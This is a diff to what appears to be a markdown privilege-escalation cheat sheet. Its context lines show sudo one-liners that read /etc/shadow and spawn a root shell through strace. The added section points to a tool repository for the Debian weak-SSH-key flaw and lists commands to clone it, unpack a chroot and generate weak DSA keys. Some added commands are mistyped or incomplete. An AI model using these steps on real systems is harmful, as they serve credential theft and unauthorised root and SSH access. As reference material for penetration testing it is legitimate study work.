@@ -93,3 +93,18 @@ sudo xxd /etc/shadow | xxd -r
 sudo strace -o /dev/null /bin/sh
 ```
 
+---
+
+## Debian-ssh
+
+[g0tmi1k tuto](https://github.com/g0tmi1k/debian-ssh)
+
+```bash
+git clone https://github.com/g0tmi1k/debian-ssh.git
+de debian-ssh/our_tools/
+tar xvjf ubunturoot.tar.bz2
+
+cp dokeygen.sh 
+chroot ubunturoot /dokeygen.sh 1 -t dsa -b 1024 -f /tmp/dsa_1024_1
+
+ssh-keygen -l -E md5 -f ~/.ssh/id_rsa.pub
